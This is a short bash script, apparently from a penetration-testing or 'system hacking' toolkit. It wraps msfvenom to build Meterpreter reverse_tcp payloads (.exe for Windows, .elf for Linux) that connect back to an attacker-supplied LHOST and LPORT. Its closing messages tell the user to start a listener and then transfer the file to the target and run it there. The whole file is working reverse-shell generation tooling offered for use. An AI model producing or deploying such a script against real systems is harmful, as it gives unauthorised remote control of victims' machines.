#!/usr/bin/env bash
# Generate reverse shell payload with msfvenom.
# Usage: generate_shell.sh <LHOST> <LPORT> <linux|windows>
set -euo pipefail

if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <LHOST> <LPORT> <linux|windows>" >&2
  exit 1
fi

LHOST="$1"
LPORT="$2"
OS="${3,,}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
REPORTS_DIR="$PROJECT_ROOT/reports/system_hacking"
mkdir -p "$REPORTS_DIR"

if ! command -v msfvenom >/dev/null 2>&1; then
  echo "msfvenom not found. Install Metasploit Framework." >&2
  exit 1
fi

TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

case "$OS" in
  windows)
    PAYLOAD="windows/x64/meterpreter/reverse_tcp"
    EXT="exe"
    OUT="$REPORTS_DIR/payload_windows_${TIMESTAMP}.exe"
    ;;
  linux)
    PAYLOAD="linux/x64/meterpreter/reverse_tcp"
    EXT="elf"
    OUT="$REPORTS_DIR/payload_linux_${TIMESTAMP}.elf"
    ;;
  *)
    echo "OS must be 'linux' or 'windows'" >&2
    exit 1
    ;;
esac

echo "[+] Generating $OS payload: LHOST=$LHOST LPORT=$LPORT"
msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "$OUT"
echo ""
echo "[+] Payload saved: $OUT"
echo "[+] Start the listener (same LHOST/LPORT) before running the payload on the target."
echo "[+] On target: transfer and run the file (Windows: run .exe; Linux: chmod +x then ./payload_linux_*.elf)."
echo "PAYLOAD_FILE=$OUT"
